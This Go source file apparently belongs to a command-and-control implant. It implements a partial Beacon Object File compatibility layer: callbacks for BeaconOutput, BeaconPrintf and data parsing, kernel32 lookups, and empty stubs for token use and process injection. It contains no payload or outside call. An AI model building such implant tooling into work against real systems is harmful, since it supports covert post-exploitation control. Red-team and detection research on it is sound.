package beacon

import (
	"bytes"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"strings"
	"syscall"
	"unsafe"
)

// todo
func InternalFunctions(funcname string) (uintptr, bool) {
	var beaconfunc uintptr
	if strings.Contains(funcname, "BeaconOutput") {
		beaconfunc = syscall.NewCallback(BeaconOutput)
	} else if strings.Contains(funcname, "BeaconDataParse") {
		beaconfunc = syscall.NewCallback(BeaconDataParse)
	} else if strings.Contains(funcname, "BeaconDataInt") {

	} else if strings.Contains(funcname, "BeaconDataShort") {
		beaconfunc = syscall.NewCallback(BeaconDataShort)
	} else if strings.Contains(funcname, "BeaconDataLength") {

	} else if strings.Contains(funcname, "BeaconDataExtract") {
		beaconfunc = syscall.NewCallback(BeaconDataExtract)
	} else if strings.Contains(funcname, "BeaconFormatAlloc") {

	} else if strings.Contains(funcname, "BeaconFormatReset") {

	} else if strings.Contains(funcname, "BeaconFormatFree") {

	} else if strings.Contains(funcname, "BeaconFormatAppend") {

	} else if strings.Contains(funcname, "BeaconFormatPrintf") {

	} else if strings.Contains(funcname, "BeaconFormatToString") {

	} else if strings.Contains(funcname, "BeaconFormatInt") {

	} else if strings.Contains(funcname, "BeaconPrintf") {
		beaconfunc = syscall.NewCallback(BeaconPrintf)
	} else if strings.Contains(funcname, "BeaconOutput") {

	} else if strings.Contains(funcname, "BeaconUseToken") {

	} else if strings.Contains(funcname, "BeaconRevertToken") {

	} else if strings.Contains(funcname, "BeaconIsAdmin") {

	} else if strings.Contains(funcname, "BeaconGetSpawnTo") {

	} else if strings.Contains(funcname, "BeaconSpawnTemporaryProcess") {

	} else if strings.Contains(funcname, "BeaconInjectProcess") {

	} else if strings.Contains(funcname, "BeaconInjectTemporaryProcess") {

	} else if strings.Contains(funcname, "BeaconCleanupProcess") {

	} else if strings.Contains(funcname, "toWideChar") {

	} else if strings.Contains(funcname, "LoadLibraryA") {
		beaconfunc = syscall.NewLazyDLL("kernel32").NewProc("LoadLibraryA").Addr()
	} else if strings.Contains(funcname, "GetProcAddress") {
		beaconfunc = syscall.NewLazyDLL("kernel32").NewProc("GetProcAddress").Addr()
	} else if strings.Contains(funcname, "GetModuleHandleA") {
		beaconfunc = syscall.NewLazyDLL("kernel32").NewProc("GetModuleHandleA").Addr()
	} else if strings.Contains(funcname, "FreeLibrary") {
		beaconfunc = syscall.NewLazyDLL("kernel32").NewProc("FreeLibrary").Addr()
	}
	if beaconfunc != 0 {
		return uintptr(beaconfunc), true
	} else {
		return 0, false
	}
}

var beaconCompatibilityOutput []byte
var beaconCompatibilitySize int
var beaconCompatibilityOffset int

func BeaconDataShort(parserPtr uintptr) uintptr {
	parser := (*Datap)(unsafe.Pointer(parserPtr))
	if parser.length < 2 {
		return 0
	}

	var retvalue int16
	Memcpy(parser.buffer, uintptr(unsafe.Pointer(&retvalue)), 2)
	parser.buffer += 2
	parser.length -= 2
	return uintptr(retvalue)
}

func BytePtrToString(p *byte) string {
	if p == nil {
		return ""
	}
	if *p == 0 {
		return ""
	}

	// Find NUL terminator.
	n := 0
	for ptr := unsafe.Pointer(p); *(*byte)(ptr) != 0; n++ {
		ptr = unsafe.Pointer(uintptr(ptr) + 1)
	}

	return string(unsafe.Slice(p, n))
}

// 未能实现可变参数,仅支持4参数以内
func BeaconPrintf(t int, ptr uintptr, a uintptr, b uintptr) uintptr {
	var length int
	bufstr := BytePtrToString((*byte)(unsafe.Pointer(ptr)))

	bufstr = fmt.Sprintf(bufstr, BytePtrToString((*byte)(unsafe.Pointer(a))), BytePtrToString((*byte)(unsafe.Pointer(b))))

	length = len(bufstr)
	data := make([]byte, length)

	Memcpy(uintptr(unsafe.Pointer(&([]byte(bufstr))[0])), uintptr(unsafe.Pointer(&data[0])), uintptr(length))
	beaconCompatibilityOutput = append(beaconCompatibilityOutput, make([]byte, length)...)
	copy(beaconCompatibilityOutput[beaconCompatibilityOffset:], data[:length])
	beaconCompatibilitySize += length
	beaconCompatibilityOffset += length
	return 0

}

type Datap struct {
	original uintptr // the original buffer [so we can free it]
	buffer   uintptr // current pointer into our buffer
	length   int     // remaining of data
	size     int     // total size of this buffer
}

func BeaconDataParse(parserPtr uintptr, buffer uintptr, size int) uintptr {
	parser := (*Datap)(unsafe.Pointer(parserPtr))
	if parser == nil {
		return 0
	}
	parser.original = buffer
	parser.buffer = buffer
	parser.length = size - 4
	parser.size = size - 4
	parser.buffer += 4
	return 0
}

func BeaconDataExtract(parserPtr uintptr, size *int) uintptr {
	length := 0
	parser := (*Datap)(unsafe.Pointer(parserPtr))

	if parser.length < 4 {
		return 0
	}

	Memcpy(parser.buffer, uintptr(unsafe.Pointer(&length)), 4)
	parser.buffer += 4

	outdata := parser.buffer
	if outdata == 0 {
		return 0
	}
	parser.length -= 4
	parser.length -= length
	parser.buffer += uintptr(length)

	if uintptr(unsafe.Pointer(size)) != 0 && outdata != 0 {
		*size = int(length)
	}

	return outdata
}

func Memcpy(src, dst, size uintptr) {
	for i := uintptr(0); i < size; i++ {
		*(*byte)(unsafe.Pointer(dst + i)) = *(*byte)(unsafe.Pointer(src + i))
	}
}

func BeaconOutput(outputType int, d uintptr, length int) uintptr {
	data := make([]byte, length)
	Memcpy(d, uintptr(unsafe.Pointer(&data[0])), uintptr(length))
	beaconCompatibilityOutput = append(beaconCompatibilityOutput, make([]byte, length)...)
	copy(beaconCompatibilityOutput[beaconCompatibilityOffset:], data[:length])
	beaconCompatibilitySize += length
	beaconCompatibilityOffset += length
	return 0
}

func GbkToUtf8(s []byte) ([]byte, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, e := ioutil.ReadAll(reader)
	if e != nil {
		return nil, e
	}
	return d, nil
}

func BeaconGetOutputData(outsize *int) string {
	outdata := string(beaconCompatibilityOutput)
	*outsize = beaconCompatibilitySize
	beaconCompatibilityOutput = nil
	beaconCompatibilitySize = 0
	beaconCompatibilityOffset = 0
	return outdata
}
